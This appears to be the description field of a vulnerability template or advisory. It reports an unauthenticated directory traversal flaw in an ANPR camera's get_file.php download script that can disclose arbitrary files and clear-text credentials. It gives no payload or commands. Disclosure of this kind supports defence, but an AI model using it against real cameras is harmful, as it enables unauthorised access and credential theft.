  description: 'The ANPR camera suffers from an unauthenticated arbitrary file disclosure
    vulnerability. Input passed through the Download Archive in Storage page using
    get_file.php script is not properly verified before being used to download files.
    This can be exploited to disclose the contents of arbitrary and sensitive files
    via directory traversal attacks and aid the attacker to disclose clear-text credentials
    resulting in authentication bypass.
